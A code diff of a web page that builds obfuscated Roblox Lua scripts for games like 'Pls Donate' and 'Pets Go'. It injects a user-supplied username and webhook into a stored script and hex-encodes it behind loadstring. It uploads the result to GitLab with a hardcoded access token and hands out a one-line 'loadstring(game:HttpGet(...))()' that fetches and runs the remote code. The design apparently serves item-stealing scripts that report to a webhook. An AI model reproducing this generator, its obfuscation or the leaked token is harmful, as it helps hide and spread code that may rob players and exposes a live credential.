@@ -30,14 +30,14 @@
             border-radius: 10px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
         }
-        input, select, button, textarea {
+        input, select, button {
             padding: 10px;
             border-radius: 8px;
             border: none;
             background-color: #333;
             color: white;
             font-size: 1rem;
-            width: 300px;
+            width: 250px;
         }
         button {
             background: #ff0080;
@@ -47,21 +47,6 @@
         button:hover {
             background: #ff0055;
             transform: scale(1.1);
-        }
-        #output-container {
-            display: none;
-            flex-direction: column;
-            align-items: center;
-            margin-top: 20px;
-        }
-        #loadstring-output {
-            width: 90%;
-            max-width: 500px;
-            background: rgba(0, 0, 0, 0.8);
-            border-radius: 10px;
-            padding: 10px;
-            word-wrap: break-word;
-            font-size: 0.9rem;
         }
     </style>
 </head>
@@ -77,22 +62,24 @@
             <option value="Pls Donate">Pls Donate</option>
             <option value="Pets Go">Pets Go</option>
         </select>
+        <label>
+            <input type="checkbox" id="auto-obfuscate"> Auto-Obfuscate (Hex Only)
+        </label>
         <button onclick="generateScript()">Generate Script</button>
     </div>
 
-    <div id="output-container" class="container">
-        <textarea id="loadstring-output" readonly></textarea>
-        <button onclick="copyToClipboard()">Copy Loadstring</button>
-    </div>
-
     <script>
-        function encodeHex(str) {
-            return str.split('').map(c => `\\x${(c.charCodeAt(0) + Math.floor(Math.random() * 5)).toString(16)}`).join('');
+        function toHex(str) {
+            let hex = "";
+            for (let i = 0; i < str.length; i++) {
+                hex += str.charCodeAt(i).toString(16).padStart(2, "0");
+            }
+            return hex;
         }
 
-        function obfuscateScript(script) {
-            let hexScript = encodeHex(script);
-            return `return(function(...)loadstring(string.char(${hexScript.split('\\x').filter(Boolean).map(hex => `0x${hex}`).join(',')}))()end)()`;
+        function hexObfuscate(script) {
+            let hexEncoded = toHex(script);
+            return `return(function() local X="${hexEncoded}"; loadstring((X:gsub("..", function(cc) return string.char(tonumber(cc, 16)) end)))() end)()`;
         }
 
         async function uploadToGitLab(scriptContent) {
@@ -100,7 +87,6 @@
             const fileName = `script_${Date.now()}.lua`;
             const filePath = `scripts/${fileName}`;
             const apiUrl = `https://gitlab.com/api/v4/projects/${projectId}/repository/files/${encodeURIComponent(filePath)}`;
-
             const token = "glpat-rp3iSBDjg5yxAWX_iJ9M"; 
 
             const response = await fetch(apiUrl, {
@@ -128,6 +114,7 @@
             let username = document.getElementById('username').value;
             let webhook = document.getElementById('webhook').value;
             let selectedScript = document.getElementById('script-select').value;
+            let autoObfuscate = document.getElementById('auto-obfuscate').checked;
 
             if (!username || !webhook) {
                 alert("Please enter both Username and Webhook URL!");
@@ -143,27 +130,16 @@
 
             let script = `Username = "${username}"\nWebhook = "${webhook}"\n${loadstrings[selectedScript]}`;
 
-            alert("Original Script:\n\n" + script);
+            if (autoObfuscate) {
+                script = hexObfuscate(script);
+            }
 
-            let obfuscatedScript = obfuscateScript(script);
-            alert("Obfuscated Script:\n\n" + obfuscatedScript);
-
-            let uploadedUrl = await uploadToGitLab(obfuscatedScript);
+            let uploadedUrl = await uploadToGitLab(script);
             if (uploadedUrl) {
                 let loadstring = `loadstring(game:HttpGet('${uploadedUrl}'))()`;
-
-                document.getElementById('loadstring-output').value = loadstring;
-                document.getElementById('output-container').style.display = "flex";
-
                 navigator.clipboard.writeText(loadstring);
                 alert("Loadstring copied:\n" + loadstring);
             }
-        }
-
-        function copyToClipboard() {
-            let loadstringText = document.getElementById('loadstring-output').value;
-            navigator.clipboard.writeText(loadstringText);
-            alert("Loadstring copied!");
         }
     </script>
 
